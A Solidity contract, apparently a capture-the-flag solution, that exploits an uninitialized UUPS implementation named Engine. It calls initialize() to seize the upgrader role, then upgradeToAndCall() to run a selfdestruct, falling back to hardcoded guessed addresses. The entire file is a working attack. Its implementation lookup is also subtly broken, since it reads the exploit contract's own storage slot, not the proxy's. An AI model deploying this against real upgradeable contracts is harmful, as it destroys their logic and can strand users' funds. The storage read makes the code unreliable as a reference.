// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function upgrader() external view returns (address);
}

contract EngineExploit {
    // Try to find and exploit the Engine contract
    function findAndExploit(address proxy) external {
        // Implementation slot for UUPS proxy
        bytes32 slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address implementation;
        
        // Read implementation address from proxy storage
        assembly {
            let result := staticcall(gas(), proxy, 0, 0, 0, 0)
            implementation := sload(slot)
        }
        
        // If we can't find it via storage, try common addresses
        if (implementation == address(0)) {
            // Try some common deployment addresses
            tryExploit(address(0x5FbDB2315678afecb367f032d93F642f64180aa3));
            tryExploit(address(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512));
            tryExploit(address(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0));
            tryExploit(address(0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9));
            tryExploit(address(0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9));
        } else {
            tryExploit(implementation);
        }
    }
    
    function tryExploit(address engine) internal {
        try IEngine(engine).upgrader() returns (address currentUpgrader) {
            // If upgrader is 0, the contract is not initialized
            if (currentUpgrader == address(0)) {
                // Initialize to become upgrader
                IEngine(engine).initialize();
                
                // Upgrade to malicious implementation
                IEngine(engine).upgradeToAndCall(
                    address(this),
                    abi.encodeWithSignature("destroy()")
                );
            }
        } catch {
            // Not the right contract or already initialized
        }
    }
    
    function destroy() external {
        selfdestruct(address(0));
    }
}